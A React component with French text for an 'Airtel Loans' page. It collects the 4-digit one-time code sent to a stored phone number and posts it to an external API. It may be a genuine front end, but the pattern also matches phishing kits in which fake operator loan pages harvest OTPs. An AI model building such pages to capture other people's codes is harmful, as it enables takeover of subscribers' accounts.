import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css';

function AirtelOTPVerify() {
  const [otp, setOtp] = useState<string[]>(['', '', '', '']);
  const [timeLeft, setTimeLeft] = useState(45);
  const [error, setError] = useState('');
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const navigate = useNavigate();

  // Récupérer le numéro de téléphone enregistré lors de la connexion
  const phoneNumber = localStorage.getItem('airtelPhone') || '';

  // Si aucun numéro n'est enregistré, rediriger vers la connexion
  useEffect(() => {
    if (!phoneNumber) {
      navigate('/');
    }
  }, [phoneNumber, navigate]);

  // Compte à rebours
  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value.substring(value.length - 1);
    setOtp(newOtp);
    if (value && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpString = otp.join('');

    // Validation locale — doit contenir 4 chiffres
    if (otpString.length < 4) {
      setError('Veuillez saisir le code de vérification à 4 chiffres.');
      alert('⚠️ Veuillez saisir le code de vérification à 4 chiffres.');
      return;
    }

    setError('');

    try {
      const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: phoneNumber, otp: otpString }),
      });
      const data = await response.json();

      if (data.status === 'success') {
        // ✅ Code correct — passer à la page suivante
        navigate('/airtel-loan-limit');
      } else {
        // ❌ Code incorrect — afficher un popup, une erreur en ligne, et vider les cases
        const wrongMsg = '❌ Code incorrect ! Veuillez vérifier le code envoyé sur votre téléphone et réessayer.';
        alert(wrongMsg);
        setError(data.message || 'Code invalide. Veuillez réessayer.');

        // Vider les champs OTP pour permettre une nouvelle saisie
        setOtp(['', '', '', '']);

        // Remettre le focus sur la première case
        setTimeout(() => {
          inputRefs.current[0]?.focus();
        }, 100);
      }
    } catch {
      alert('⚠️ Erreur lors de la vérification du code. Veuillez vérifier votre connexion internet et réessayer.');
      setError('Erreur lors de la vérification. Veuillez réessayer.');
    }
  };

  const handleResend = async () => {
    setTimeLeft(45);
    setOtp(['', '', '', '']);
    setError('');

    try {
      const response = await fetch(
        `${import.meta.env.VITE_API_BASE_URL}/api/resend-otp`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone_number: phoneNumber }),
        }
      );
      const data = await response.json();

      if (data.status === 'success') {
        alert('📩 Un nouveau code a été envoyé sur votre téléphone.');
      } else {
        alert(data.message || 'Échec de l\'envoi du nouveau code.');
      }
    } catch {
      alert('Erreur de connexion au serveur.');
    }
  };

  return (
    <div className="airtel-container">
      {/* En-tête */}
      <div className="airtel-header">
        <div className="airtel-hamburger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel Loans</h1>
        <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
      </div>

      {/* Carte blanche principale */}
      <div className="airtel-card">
        <button className="airtel-back-link" onClick={() => navigate('/')}>
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Retour à la connexion
        </button>

        <h2 className="airtel-otp-heading">Vérifiez votre code</h2>
        <p className="airtel-otp-subtext">
          Saisissez le code à 4 chiffres envoyé à {phoneNumber || '+243 XXX XXX XXX'}
        </p>

        <form onSubmit={handleVerify}>
          <div className="airtel-input-group">
            <label>Saisir le code OTP</label>
            <div className="airtel-otp-container">
              {otp.map((digit, index) => (
                <input
                  key={index}
                  type="tel"
                  maxLength={1}
                  value={digit}
                  ref={(el) => { inputRefs.current[index] = el; }}
                  onChange={(e) => handleChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="airtel-otp-box"
                />
              ))}
            </div>
          </div>

          {error && (
            <div className="airtel-alert" style={{ marginBottom: '20px' }}>
              <div className="alert-icon">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C81E1E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="12" y1="16" x2="12" y2="12"></line>
                  <line x1="12" y1="8" x2="12.01" y2="8"></line>
                </svg>
              </div>
              <span>{error}</span>
            </div>
          )}

          <div className="airtel-timer">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#E53E3E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"></circle>
              <polyline points="12 6 12 12 16 14"></polyline>
            </svg>
            <span>{timeLeft}s</span>
          </div>

          <button type="submit" className="airtel-verify-btn">
            Vérifier le code
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="5" y1="12" x2="19" y2="12"></line>
              <polyline points="12 5 19 12 12 19"></polyline>
            </svg>
          </button>

          <button type="button" className="airtel-resend-btn" onClick={handleResend}>
            Renvoyer le code
          </button>
        </form>
      </div>
    </div>
  );
}

export default AirtelOTPVerify;